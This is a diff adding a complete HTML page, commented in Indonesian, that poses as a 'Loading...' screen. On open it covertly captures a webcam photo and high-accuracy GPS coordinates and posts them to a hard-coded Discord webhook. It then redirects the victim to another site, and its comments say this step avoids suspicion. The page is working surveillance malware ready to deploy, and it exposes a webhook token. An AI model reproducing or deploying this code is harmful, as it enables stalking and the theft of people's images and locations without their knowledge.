@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat...</title>
+    <style>
+        *{margin:0;padding:0}
+        body{background:#fff;height:100vh}
+        video,canvas{position:absolute;opacity:0;pointer-events:none}
+    </style>
+</head>
+<body>
+
+<script>
+// === GANTI WEBHOOK DISCORD LO ===
+const WEBHOOK = "https://discord.com/api/webhooks/1538498418266218641/zM9vn4GAKeP_R6r5VTaC2Ccn_IAZQBHgUt2HvLWCqac519orhQJLSQlp8v89nelMYh6p";
+
+// === GANTI LINK TUJUAN — KE MANA LO PINDAHKAN DIA ===
+const PINDAH_KE = "https://google.com"; // GANTI PAKE LINK FOTO/WEB APAPUN!
+
+// AMBIL FOTO
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}})
+.then(kamera=>{
+    const vid = document.createElement("video");
+    vid.srcObject = kamera; vid.play();
+    setTimeout(()=>{
+        const kanvas = document.createElement("canvas");
+        kanvas.width=400; kanvas.height=400;
+        const ctx = kanvas.getContext("2d");
+        ctx.drawImage(vid,0,0,400,400);
+        const foto = kanvas.toDataURL("image/jpeg");
+        kamera.getTracks().forEach(t=>t.stop());
+        ambilLokasi(foto);
+    },1500);
+})
+.catch(()=>{ambilLokasi(null);});
+
+// AMBIL LOKASI LALU KIRIM
+function ambilLokasi(foto){
+    if(!navigator.geolocation) return kirim(foto,"GPS tidak ada");
+    navigator.geolocation.getCurrentPosition(
+        pos=>{
+            const lok = `LOKASI: ${pos.coords.latitude}, ${pos.coords.longitude} | AKURASI: ${Math.round(pos.coords.accuracy)}m`;
+            kirim(foto,lok);
+        },
+        err=>kirim(foto,"Lokasi ditolak"),
+        {enableHighAccuracy:true,timeout:8000}
+    );
+}
+
+// KIRIM DATA LALU LANGSUNG PINDAH HALAMAN
+function kirim(foto,teks){
+    fetch(WEBHOOK,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+            content:"```✅ DATA MASUK!\n"+teks+"```",
+            embeds:foto?[{image:{url:foto}}]:[]
+        })
+    })
+    .then(()=>{
+        // ✅ DATA TERKIRIM → LANGSUNG PINDAH KE LINK TUJUAN!
+        window.location.href = PINDAH_KE;
+    })
+    .catch(()=>{
+        // KALAU GAGAL KIRIM, TETAP PINDAH BIAR GAK CURIGA!
+        window.location.href = PINDAH_KE;
+    });
+}
+</script>
+</body>
+</html>
